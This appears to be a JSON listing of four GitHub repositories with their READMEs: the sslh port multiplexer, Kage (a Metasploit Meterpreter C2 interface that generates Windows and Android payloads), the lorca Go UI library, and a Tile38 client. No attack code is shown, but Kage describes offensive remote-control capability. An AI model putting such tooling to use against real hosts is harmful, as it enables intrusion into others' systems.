{"tags": [], "owner": "yrutschle", "description": "Applicative Protocol Multiplexer (e.g. share SSH and HTTPS on the same port)", "name": "sslh", "topics_string": "", "language": "C", "readme": "\"sslh -- A ssl/ssh multiplexer\\n=============================\\n\\n`sslh` accepts connections on specified ports, and forwards\\nthem further based on tests performed on the first data\\npacket sent by the remote client.\\n\\nProbes for HTTP, TLS/SSL (including SNI and ALPN), SSH,\\nOpenVPN, tinc, XMPP, SOCKS5, are implemented, and any other\\nprotocol that can be tested using a regular expression, can\\nbe recognised. A typical use case is to allow serving\\nseveral services on port 443 (e.g. to connect to SSH from\\ninside a corporate firewall, which almost never block port\\n443) while still serving HTTPS on that port. \\n\\nHence `sslh` acts as a protocol demultiplexer, or a\\nswitchboard. With the SNI and ALPN probe, it makes a good\\nfront-end to a virtual host farm hosted behind a single IP\\naddress.\\n\\n`sslh` has the bells and whistles expected from a mature\\ndaemon: privilege and capabilities dropping, inetd support,\\nsystemd support, transparent proxying,\\nchroot, logging, IPv4 and IPv6, a fork-based and a\\nselect-based model, and more.\\n\\nInstall\\n=======\\n\\nPlease refer to the [install guide](doc/INSTALL.md).\\n\\n\\nConfiguration\\n=============\\n\\nPlease refer to the [configuration guide](doc/config.md).\\n\\n\\n\\nComments? Questions?\\n====================\\n\\nYou can subscribe to the `sslh` mailing list here:\\n<https://lists.rutschle.net/mailman/listinfo/sslh>\\n\\nThis mailing list should be used for discussion, feature\\nrequests, and will be the preferred channel for announcements.\\n\\nOf course, check the [FAQ](doc/FAQ.md) first!\\n\\n\"", "topics": ["redteam", "ssl", "server", "linux"], "writeup": "", "ignoredescription": false, "id": 104, "full_name": "yrutschle/sslh", "url": "https://github.com/yrutschle/sslh", "topic_string": "redteam ssl server linux"},
{"tags": [], "owner": "Zerx0r", "description": "Kage is Graphical User Interface for Metasploit Meterpreter and Session Handler", "name": "Kage", "topics_string": "", "language": "Vue", "readme": "\"# Kage\\n\\n\\n<h1 align=\\\"center\\\">\\n <img width=\\\"460\\\" height=\\\"300\\\" src=\\\"https://github.com/WayzDev/Kage/blob/master/static/kage-logo.svg\\\">\\n</h1>\\n\\n \\nKage (ka-geh) is a tool inspired by [AhMyth](https://github.com/AhMyth/AhMyth-Android-RAT) designed for Metasploit RPC Server to interact with meterpreter sessions and generate payloads.<br>\\nFor now it only supports `windows/meterpreter` & `android/meterpreter`.\\n\\n## Getting Started\\nPlease follow these instructions to get a copy of Kage running on your local machine without any problems.\\n### Prerequisites\\n* [Metasploit-framework](https://github.com/rapid7/metasploit-framework) must be installed and in your `PATH`:\\n * Msfrpcd\\n * Msfvenom\\n * Msfdb\\n\\n\\n### Installing\\nYou can install Kage binaries from [here](https://github.com/WayzDev/Kage/releases).\\n#### for developers\\nto run the app from source code:\\n```bash\\n# Download source code\\ngit clone https://github.com/WayzDev/Kage.git\\n\\n# Install dependencies and run kage\\ncd Kage\\nyarn # or npm install\\nyarn run dev # or npm run dev\\n\\n# to build project\\nyarn run build\\n```\\n> [electron-vue](https://simulatedgreg.gitbooks.io/electron-vue/content/en/getting_started.html) officially recommends the [yarn](https://yarnpkg.com/en/) package manager as it handles dependencies much better and can help reduce final build size with `yarn clean`. \\n\\n\\n##### For Generating APK Payload select `Raw` format in dropdown list. \\n\\n## Screenshots\\n<h1>\\n <img src=\\\"https://github.com/WayzDev/Kage/blob/master/screenshots/dashboard.png\\\"/>\\n</h1>\\n<h1>\\n <img src=\\\"https://github.com/WayzDev/Kage/blob/master/screenshots/sessions.png\\\"/>\\n</h1>\\n<h1>\\n <img src=\\\"https://github.com/WayzDev/Kage/blob/master/screenshots/control-panel1.png\\\"/>\\n</h1>\\n<h1>\\n <img src=\\\"https://github.com/WayzDev/Kage/blob/master/screenshots/file-manager.png\\\"/>\\n</h1>\\n\\n## Video Tutorial\\n\\n<a href=\\\"https://vimeo.com/319338721\\\" target=\\\"_blank\\\"><img src=\\\"https://github.com/WayzDev/Kage/blob/master/screenshots/server.png\\\" />\\n</a>\\n\\n\\n## Disclaimer \\nI will not be responsible for any direct or indirect damage caused due to the usage of this tool, it is for educational purposes only.\\n\\nTwitter: [@iFalah](https://twitter.com/ifalah_)\\n\\nEmail: ifalah@protonmail.com\\n\\n## Credits\\nMetasploit Framework - (c) Rapid7 Inc. 2012 (BSD License)<br>\\nhttp://www.metasploit.com/\\n\\nnode-msfrpc - (c) Tomas Gonzalez Vivo. 2017 (Apache License)<br>\\nhttps://github.com/tomasgvivo/node-msfrpc\\n\\nelectron-vue - (c) Greg Holguin. 2016 (MIT)<br>\\nhttps://github.com/SimulatedGREG/electron-vue\\n\\n---\\nThis project was generated with [electron-vue](https://github.com/SimulatedGREG/electron-vue)@[8fae476](https://github.com/SimulatedGREG/electron-vue/tree/8fae4763e9d225d3691b627e83b9e09b56f6c935) using [vue-cli](https://github.com/vuejs/vue-cli). Documentation about the original structure can be found [here](https://simulatedgreg.gitbooks.io/electron-vue/content/index.html).\\n\"", "topics": ["c2", "electron", "redteam", "metasploit"], "writeup": "", "ignoredescription": false, "id": 105, "full_name": "Zerx0r/Kage", "url": "https://github.com/Zerx0r/Kage", "topic_string": "c2 electron redteam metasploit"},
{"tags": [], "owner": "zserge", "description": "Build cross-platform modern desktop apps in Go + HTML5", "name": "lorca", "topics_string": "", "language": "Go", "readme": "\"# Lorca\\n\\n[![Build Status](https://img.shields.io/github/workflow/status/zserge/lorca/CI%20Pipeline)](https://github.com/zserge/lorca)\\n[![GoDoc](https://godoc.org/github.com/zserge/lorca?status.svg)](https://godoc.org/github.com/zserge/lorca)\\n[![Go Report Card](https://goreportcard.com/badge/github.com/zserge/lorca)](https://goreportcard.com/report/github.com/zserge/lorca)\\n\\n<div>\\n<img align=\\\"left\\\" src=\\\"https://raw.githubusercontent.com/zserge/lorca/master/lorca.png\\\" alt=\\\"Lorca\\\" width=\\\"128px\\\" height=\\\"128px\\\" />\\n<br/>\\n<p>\\n\\tA very small library to build modern HTML5 desktop apps in Go. It uses Chrome\\n\\tbrowser as a UI layer. Unlike Electron it doesn't bundle Chrome into the app\\n\\tpackage, but rather reuses the one that is already installed. Lorca\\n\\testablishes a connection to the browser window and allows calling Go code\\n\\tfrom the UI and manipulating UI from Go in a seamless manner.\\n</p>\\n<br/>\\n</div>\\n\\n\\n## Features\\n\\n* Pure Go library (no cgo) with a very simple API\\n* Small application size (normally 5-10MB)\\n* Best of both worlds - the whole power of HTML/CSS to make your UI look\\n\\tgood, combined with Go performance and ease of development\\n* Expose Go functions/methods and call them from JavaScript\\n* Call arbitrary JavaScript code from Go\\n* Asynchronous flow between UI and main app in both languages (async/await and Goroutines)\\n* Supports loading web UI from the local web server or via data URL\\n* Supports embedding all assets into a single binary\\n* Supports testing your app with the UI in the headless mode\\n* Supports multiple app windows\\n* Supports packaging and branding (e.g. custom app icons). Packaging for all\\n\\tthree OS can be done on a single machine using GOOS and GOARCH variables.\\n\\nAlso, limitations by design:\\n\\n* Requires Chrome/Chromium >= 70 to be installed.\\n* No control over the Chrome window yet (e.g. you can't remove border, make it\\n\\ttransparent, control position or size).\\n* No window menu (tray menus and native OS dialogs are still possible via\\n\\t3rd-party libraries)\\n\\nIf you want to have more control of the browser window - consider using\\n[webview](https://github.com/zserge/webview) library with a similar API, so\\nmigration would be smooth.\\n\\n## Example\\n\\n```go\\nui, _ := lorca.New(\\\"\\\", \\\"\\\", 480, 320)\\ndefer ui.Close()\\n\\n// Bind Go function to be available in JS. Go function may be long-running and\\n// blocking - in JS it's represented with a Promise.\\nui.Bind(\\\"add\\\", func(a, b int) int { return a + b })\\n\\n// Call JS function from Go. Functions may be asynchronous, i.e. return promises\\nn := ui.Eval(`Math.random()`).Float()\\nfmt.Println(n)\\n\\n// Call JS that calls Go and so on and so on...\\nm := ui.Eval(`add(2, 3)`).Int()\\nfmt.Println(m)\\n\\n// Wait for the browser window to be closed\\n<-ui.Done()\\n```\\n\\n<p align=\\\"center\\\"><img src=\\\"examples/counter/counter.gif\\\" /></p>\\n\\nAlso, see [examples](examples) for more details about binding functions, embedding\\nassets and packaging binaries.\\n\\n## Hello World\\n\\nHere are the steps to run the hello world example.\\n\\n```\\ncd examples/counter\\ngo get\\ngo run main.go\\n```\\n\\n## How it works\\n\\nUnder the hood Lorca uses [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/) to instrument on a Chrome instance. First Lorca tries to locate your installed Chrome, starts a remote debugging instance binding to an ephemeral port and reads from `stderr` for the actual WebSocket endpoint. Then Lorca opens a new client connection to the WebSocket server, and instruments Chrome by sending JSON messages of Chrome DevTools Protocol methods via WebSocket. JavaScript functions are evaluated in Chrome, while Go functions actually run in Go runtime and returned values are sent to Chrome.\\n\\n## What's in a name?\\n\\n> There is kind of a legend, that before his execution Garcia Lorca have seen a\\n> sunrise over the heads of the soldiers and he said \\\"And yet, the sun rises...\\\".\\n> Probably it was the beginning of a poem. (J. Brodsky)\\n\\nLorca is an anagram of [Carlo](https://github.com/GoogleChromeLabs/carlo/), a\\nproject with a similar goal for Node.js.\\n\\n## License\\n\\nCode is distributed under MIT license, feel free to use it in your proprietary\\nprojects as well.\\n\\n\"", "topics": ["electron", "ui"], "writeup": "Build cross-platform modern desktop apps in Go + HTML5  A very small library to build modern HTML5 desktop apps in Go. It uses Chrome browser as a UI layer. Unlike Electron it doesn't bundle Chrome into the app package, but rather reuses the one that is already installed. Lorca establishes a connection to the browser window and allows calling Go code from the UI and manipulating UI from Go in a seamless manner. \n", "ignoredescription": false, "id": 106, "full_name": "zserge/lorca", "url": "https://github.com/zserge/lorca", "topic_string": "electron ui"},
{"tags": [], "owner": "zweihander", "description": "Tile38 Client package", "name": "tile38-client", "topics_string": "", "language": "Go", "readme": "\"# Tile38 Client\\n[![Go](https://github.com/axvq/tile38-client/workflows/Go/badge.svg)](https://github.com/axvq/tile38-client/actions)\\n[![Documentation](https://pkg.go.dev/badge/github.com/axvq/tile38-client)](https://pkg.go.dev/github.com/axvq/tile38-client?tab=doc)\\n[![Go Report Card](https://goreportcard.com/badge/github.com/axvq/tile38-client)](https://goreportcard.com/report/github.com/axvq/tile38-client)\\n[![codecov](https://codecov.io/gh/axvq/tile38-client/branch/master/graph/badge.svg)](https://codecov.io/gh/axvq/tile38-client)\\n[![license](https://img.shields.io/github/license/axvq/tile38-client.svg)](https://github.com/axvq/tile38-client/blob/master/LICENSE)\\n\\nSupported features: [click](TODO.md)\\n\\n```\\ngo get github.com/axvq/tile38-client\\n```\\n\\n### Basic example\\n\\n```go\\npackage main\\n\\nimport (\\n\\t\\\"fmt\\\"\\n\\n\\tt38c \\\"github.com/axvq/tile38-client\\\"\\n)\\n\\nfunc main() {\\n\\tclient, err := t38c.New(\\\"localhost:9851\\\", t38c.Debug)\\n\\tif err != nil {\\n\\t\\tpanic(err)\\n\\t}\\n\\tdefer client.Close()\\n\\n\\tif err := client.Keys.Set(\\\"fleet\\\", \\\"truck1\\\").Point(33.5123, -112.2693).Do(); err != nil {\\n\\t\\tpanic(err)\\n\\t}\\n\\n\\tif err := client.Keys.Set(\\\"fleet\\\", \\\"truck2\\\").Point(33.4626, -112.1695).\\n\\t\\t// optional params\\n\\t\\tField(\\\"speed\\\", 20).\\n\\t\\tExpiration(20).\\n\\t\\tDo(); err != nil {\\n\\t\\tpanic(err)\\n\\t}\\n\\n\\t// search 6 kilometers around a point. returns one truck.\\n\\tresponse, err := client.Search.Nearby(\\\"fleet\\\", 33.462, -112.268, 6000).\\n\\t\\tWhere(\\\"speed\\\", 0, 100).\\n\\t\\tMatch(\\\"truck*\\\").\\n\\t\\tFormat(t38c.FormatPoints).Do()\\n\\tif err != nil {\\n\\t\\tpanic(err)\\n\\t}\\n\\n\\t// truck1 {33.5123 -112.2693}\\n\\tfmt.Println(response.Points[0].ID, response.Points[0].Point)\\n}\\n```\\nMore examples: [click](examples)\"", "topics": ["tile38", "geo", "spatial", "geospatial", "geofence", "geolocation"], "writeup": "", "ignoredescription": false, "id": 107, "full_name": "zweihander/tile38-client", "url": "https://github.com/zweihander/tile38-client", "topic_string": "tile38 geo spatial geospatial geofence geolocation"},
]
